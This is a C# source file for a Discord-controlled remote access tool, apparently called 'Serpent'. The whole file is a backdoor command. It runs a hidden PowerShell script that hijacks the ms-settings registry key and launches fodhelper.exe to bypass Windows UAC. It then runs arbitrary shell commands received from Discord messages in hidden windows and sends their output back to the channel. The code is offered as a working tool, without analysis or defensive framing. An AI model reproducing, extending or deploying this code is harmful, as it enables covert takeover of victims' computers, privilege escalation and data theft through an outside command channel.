using System.Diagnostics;
using Discord;
using Discord.WebSocket;
using Helper;

namespace Commands {
    public static class UACShell {

        public static readonly string[] NotUsableCommands = {
            "tasklist",
            "powershell.exe",
            "fodhelper.exe"
        };

        public static async Task Run(SocketUserMessage Message, string[] args) {

            if (NotUsableCommands.Contains(args[0]) || string.Join(" ", args).Length > 2000) {
                
                Embed Emb = new SerpentEmbed().GetEmbed(SerpentEmbeds.Warning, $"", $"Command ``{args[0]}`` can't be used due to its big output size.");

                await Message.ReplyAsync(embed: Emb);

                return;
            }

            string powershellScript = @"
                New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
                New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
                Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value $program -Force
            ";

            ProcessStartInfo powershellInfo = new ProcessStartInfo() {
                FileName = "powershell.exe",
                Arguments = powershellScript,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            try {

                Process powershellProcess = new Process() { StartInfo = powershellInfo };
                powershellProcess.Start();
                powershellProcess.WaitForExit();

                ProcessStartInfo fodHelperInfo = new ProcessStartInfo() {
                    FileName = "fodhelper.exe",
                    UseShellExecute = true
                };

                Process fodHelperProcess = new Process() { StartInfo = fodHelperInfo };
                fodHelperProcess.Start();
                fodHelperProcess.WaitForExit();

                ProcessStartInfo Sinfo = new ProcessStartInfo() {
                    FileName = "cmd.exe",
                    Arguments = "/C " + string.Join(" ", args),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                new Thread(async () => {

                    Process Shell = new Process() { StartInfo = Sinfo };
                    Shell.Start();
                    Shell.WaitForExit();

                    string output = await Shell.StandardOutput.ReadToEndAsync();
                    string errOutput = await Shell.StandardError.ReadToEndAsync();
                    string Sent = string.IsNullOrEmpty(output) ? errOutput : output;
                    string Final = string.IsNullOrEmpty(Sent) ? "None" : Sent;
                    Embed EmbedToSend = new SerpentEmbed().GetEmbed(SerpentEmbeds.Success, $"Result of {args[0]}", $"```py\n{Final}```");
                    await Message.ReplyAsync(embed: EmbedToSend);

                }).Start();

            } catch (Exception e) {

                Console.WriteLine("Error.");

            }
        }
    }
}
